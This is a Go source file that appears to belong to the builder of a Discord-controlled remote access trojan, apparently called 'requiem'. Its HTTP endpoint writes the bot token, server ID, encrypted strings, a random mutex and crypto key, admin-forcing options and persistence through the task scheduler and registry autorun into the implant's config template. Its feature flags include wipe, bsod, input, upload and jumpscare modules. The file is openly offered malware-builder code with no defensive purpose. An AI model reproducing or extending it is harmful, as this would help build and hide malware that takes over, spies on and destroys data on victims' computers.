package routes

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"path/filepath"

	"builder/store"
	"builder/utils"
)

const (
	CRYPTO_KEY_LEN int = 32
	MUTEX_NAME_LEN int = 9
	LAUNCH_KEY_LEN int = 12
)

type Body struct {
	Tag string `json:"tag"`

	BotToken      string `json:"bot_token"`
	ServerID      string `json:"server_id"`
	CategoryID    string `json:"category_id"`
	CommandPrefix string `json:"command_prefix"`
	TrackingID    string `json:"tracking_id"`

	UseCustomDirectory bool   `json:"use_custom_directory"`
	CustomDirectory    string `json:"custom_directory_path"`
	UseCustomName      bool   `json:"use_custom_name"`
	CustomName         string `json:"custom_name"`

	RequireAdmin         bool `json:"require_admin"`
	PromptAdmin          bool `json:"prompt_admin"`
	ForceAdmin           bool `json:"force_admin"`
	ContinueWithoutAdmin bool `json:"continue_without_admin"`
	ConnectBotMaxRetries int  `json:"connect_bot_max_retries"`
	ConnectBotRetryDelay int  `json:"connect_bot_retry_delay"`
	ExitIfCantConnect    bool `json:"exit_if_cannot_connect"`

	PersistenceName string `json:"persistence_name"`
	TaskSchedular   bool   `json:"task_schedular"`
	Registry        bool   `json:"registry"`

	Audio      bool `json:"audio"`
	Brightness bool `json:"brightness"`
	Bsod       bool `json:"bsod"`
	Critical   bool `json:"critical"`
	Download   bool `json:"download"`
	File       bool `json:"file"`
	Input      bool `json:"input"`
	Jumpscare  bool `json:"jumpscare"`
	Macro      bool `json:"macro"`
	Msgbox     bool `json:"msgbox"`
	Persist    bool `json:"persist"`
	Ping       bool `json:"ping"`
	Rotate     bool `json:"rotate"`
	Run        bool `json:"run"`
	Ss         bool `json:"ss"`
	Site       bool `json:"site"`
	Tree       bool `json:"tree"`
	Tts        bool `json:"tts"`
	Update     bool `json:"update"`
	Upload     bool `json:"upload"`
	Volume     bool `json:"volume"`
	Wallpaper  bool `json:"wallpaper"`
	Wipe       bool `json:"wipe"`
}

func updateConfig() {
	http.HandleFunc("/api/update-config", func(write http.ResponseWriter, req *http.Request) {
		config := filepath.Join(store.Main, "store", "config.go")

		if store.DEBUG {
			fmt.Println("requiem config - " + config)
		}

		var body Body

		err := json.NewDecoder(req.Body).Decode(&body)
		if err != nil {
			http.Error(write, fmt.Sprintf("failed to decode body - %s", err), http.StatusInternalServerError)
			return
		}

		data, err := os.ReadFile(config)
		if err != nil {
			http.Error(write, fmt.Sprintf("failed to read file - %s", err), http.StatusInternalServerError)
			return
		}

		content := string(data)

		cryptKey := utils.GenString(CRYPTO_KEY_LEN)
		utils.SetCryptKey(cryptKey)

		if store.DEBUG {
			fmt.Println("crypto key - " + cryptKey)
		}

		utils.ReplaceString(&content, "LAUNCH_KEY", utils.GenString(LAUNCH_KEY_LEN))
		utils.ReplaceString(&content, "MUTEX_NAME", utils.GenString(MUTEX_NAME_LEN))
		utils.ReplaceString(&content, "CRYPTO_KEY", cryptKey)

		utils.ReplaceString(&content, "BOT_TOKEN", utils.Encrypt(body.BotToken))
		utils.ReplaceString(&content, "SERVER_ID", utils.Encrypt(body.ServerID))
		utils.ReplaceString(&content, "CATEGORY_ID", utils.Encrypt(body.CategoryID))
		utils.ReplaceString(&content, "COMMAND_PREFIX", body.CommandPrefix)
		utils.ReplaceString(&content, "TRACKING_ID", utils.Encrypt(body.TrackingID))

		utils.ReplaceBool(&content, "USE_CUSTOM_NAME", body.UseCustomName)
		utils.ReplaceString(&content, "CUSTOM_NAME", utils.Encrypt(body.CustomName))
		utils.ReplaceBool(&content, "USE_CUSTOM_DIR", body.UseCustomDirectory)
		utils.ReplaceString(&content, "CUSTOM_DIR", utils.Encrypt(body.CustomDirectory))

		utils.ReplaceBool(&content, "REQUIRE_ADMIN", body.RequireAdmin)
		utils.ReplaceBool(&content, "PROMPT_ADMIN", body.PromptAdmin)
		utils.ReplaceBool(&content, "FORCE_ADMIN", body.ForceAdmin)
		utils.ReplaceBool(&content, "CONTINUE_WITHOUT_ADMIN", body.ContinueWithoutAdmin)
		utils.ReplaceInt(&content, "OPEN_BOT_SOCKET_MAX_RETRIES", body.ConnectBotMaxRetries)
		utils.ReplaceInt(&content, "OPEN_BOT_SOCKET_DELAY", body.ConnectBotRetryDelay)
		utils.ReplaceBool(&content, "EXIT_IF_CANT_CONNECT", body.ExitIfCantConnect)

		utils.ReplaceString(&content, "PERSISTENCE_NAME", utils.Encrypt(body.PersistenceName))
		utils.ReplaceBool(&content, "TASK_SCHEDULAR", body.TaskSchedular)
		utils.ReplaceBool(&content, "AUTO_RUN_REG", body.Registry)

		err = os.WriteFile(config, []byte(content), 0666)
		if err != nil {
			http.Error(write, fmt.Sprintf("failed to write config - %s", err), http.StatusInternalServerError)
			return
		}

		store.Tag = body.Tag

		// todo: update modules thing

		write.WriteHeader(http.StatusOK)
	})
}
